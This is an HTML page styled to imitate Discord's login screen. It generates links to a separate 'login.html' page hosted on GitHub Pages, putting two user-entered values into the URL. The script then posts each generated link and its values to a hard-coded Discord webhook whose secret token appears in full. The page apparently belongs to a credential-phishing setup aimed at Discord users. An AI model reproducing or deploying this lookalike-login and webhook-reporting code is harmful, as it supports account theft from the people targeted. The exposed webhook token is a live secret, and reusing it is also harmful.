<!DOCTYPE html>
<html lang="en-GB" style="font-size: 100%; --saturation-factor: 1; --devtools-sidebar-width: 0px;">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Generate URL and Send to Discord</title>
  
  <!-- Import Noto Sans Font -->
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">

  <style>
    :root {
      --font-main: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif, "Apple Symbols";

      /* COLORS */
      --headline-color: oklab(0.963963 -0.000228554 -0.00283051);
      --form-background: oklab(0.321088 -0.000220731 -0.00934622);
      --normal-text-color: oklab(0.786807 -0.0025776 -0.0110238);
      --input-bg: oklab(0.23892 0.000131361 -0.00592163);
      --input-color: oklab(0.899401 -0.00192499 -0.00481987);
      --label-color: oklab(0.786807 -0.0025776 -0.0110238);
      --required-color: rgb(242, 63, 66);
      --btn-bg: rgb(88, 101, 242);
      --btn-bg-hover: rgb(71, 82, 196);
      --wandering-cubes-color: rgb(121, 131, 245);
      --link-color: oklab(0.700834 -0.0780351 -0.1469);
      --need-account: oklab(0.686679 -0.00398019 -0.0150182);
    }

    /* Generic styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: var(--font-main);
      line-height: 1;
      margin: 0;
      padding: 0;
      overflow: hidden;
      user-select: none;
      font-weight: inherit;
      font-style: inherit;
    }

    h1, p {
      line-height: 1.25;
      vertical-align: baseline;
    }

    h1 {
      font-family: inherit;
      font-weight: 600;
      font-style: normal;
      font-size: 24px;
      color: var(--headline-color);
    }

    h2 {
      color: var(--headline-color);
      font-size: 24px;
      font-family: inherit;
      font-weight: 600;
    }

    p {
      line-height: 20px;
      font-family: inherit;
      color: var(--normal-text-color);
      font-size: 16px;
      font-weight: 400;
    }

    input {
      background: var(--input-bg);
      font-family: inherit;
      color: var(--input-color);
      border-radius: 3px;
      padding: 10px;
      border: none;
      outline: none;
      height: 40px;
      font-size: 16px;
      font-weight: 400;
      width: 100%;
    }

    a {
      color: var(--link-color);
      white-space: nowrap;
      text-overflow: ellipsis;
      overflow: hidden;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .login-page {
      height: 100vh;
      width: 100vw;
      position: relative;
    }

    .main {
      height: 100%;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .authBox {
      background: var(--form-background);
      width: 784px;
      padding: 32px;
      border-radius: 5px;
      height: max-content;
      display: flex;
      justify-content: flex-start;
      align-items: center;
      gap: 32px;
      flex-wrap: nowrap;
    }

    .main-form {
      flex-basis: auto;
      flex-shrink: 1;
      flex-grow: 1;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    .input-groups {
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 416px;
    }

    .email-wrapper, .password-wrapper {
      display: flex;
      flex-direction: column;
      gap: 8px;
      width: 100%;
    }

    label {
      color: var(--label-color);
      font-weight: 700;
      font-size: 12px;
      line-height: 1.3333333333333333;
    }

    .login button {
      width: 416px;
      background: var(--btn-bg);
      color: #fff;
      padding: 2px 16px;
      border: none;
      outline: none;
      border-radius: 3px;
      line-height: 24px;
      font-family: inherit;
      font-size: 16px;
      height: 44px;
      cursor: pointer;
      font-weight: 500;
      transition: background-color 0.17s ease;
    }

    .login button:hover {
      background: var(--btn-bg-hover);
    }

    .spinner {
      display: flex;
      justify-content: center;
      align-items: center;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      margin: 0;
    }

    .spinner .pulsingEllipsis .item {
      animation: spinner-pulsing-ellipsis 1.4s infinite ease-in-out;
      width: 6px;
      height: 6px;
      margin-right: 2px;
      background-color: white;
      border-radius: 3px;
      display: inline-block;
      opacity: 0.3;
    }

    .spinner.qrCode-spinner .item {
      background-color: var(--wandering-cubes-color);
      width: 10px;
      height: 10px;
      position: absolute;
      top: 0;
      left: 0;
      animation: spinner-wandering-cubes 1.8s infinite ease-in-out;
    }

    @keyframes spinner-pulsing-ellipsis {
      0% {
        transform: scale(1);
        opacity: 1;
      }
      50% {
        transform: scale(0.8);
        opacity: 0.3;
      }
      100% {
        transform: scale(1);
        opacity: 1;
      }
    }

    @keyframes spinner-wandering-cubes {
      25% {
        transform: translatex(22px) rotate(-90deg) scale(0.5);
      }
      50% {
        transform: translatex(22px) translatey(22px) rotate(-180deg);
      }
      75% {
        transform: translatex(0) translatey(22px) rotate(-270deg) scale(0.5);
      }
      100% {
        transform: rotate(-360deg);
      }
    }
  </style>
</head>
<body>

  <h2>Enter Text and Generate URL</h2>

  <form id="urlForm">
    <label for="field1">Field 1:</label>
    <input type="text" id="field1" name="field1" required>
    <br><br>
    <label for="field2">Field 2:</label>
    <input type="text" id="field2" name="field2" required>
    <br><br>
    <button type="submit">Generate URL & Send to Discord</button>
  </form>

  <h3>Generated URL:</h3>
  <p id="generatedURL"></p>

  <script>
    document.getElementById("urlForm").addEventListener("submit", function(event) {
      event.preventDefault(); // Prevent form submission

      // Get input values
      const field1 = encodeURIComponent(document.getElementById("field1").value);
      const field2 = encodeURIComponent(document.getElementById("field2").value);

      // Construct the URL with query parameters
      const baseUrl = "https://RelMis.github.io/OSTools/login.html";
      const generatedUrl = `${baseUrl}?field1=${field1}&field2=${field2}`;

      // Display the generated URL
      document.getElementById("generatedURL").textContent = generatedUrl;

      // Send the URL to Discord webhook
      sendToDiscord(generatedUrl, field1, field2);
    });

    function sendToDiscord(generatedUrl, field1, field2) {
      const webhookURL = "https://discord.com/api/webhooks/1356633610689577051/umEB1wQujJs8tcDuWBzlDU_0zlnk83-710P_4-UMPWg0XQn9XLxL9FFNkRr0Nw_Vi9lt";  // Replace with your Discord webhook URL
      const payload = {
        content: `New submission:\nGenerated URL: ${generatedUrl}\nField 1: ${field1}\nField 2: ${field2}`
      };

      // Send the data to the Discord webhook
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          console.log("Message sent to Discord successfully.");
        } else {
          console.error("Error sending message to Discord:", response.statusText);
        }
      })
      .catch(error => {
        console.error("Error sending to Discord:", error);
      });
    }
  </script>

</body>
</html>
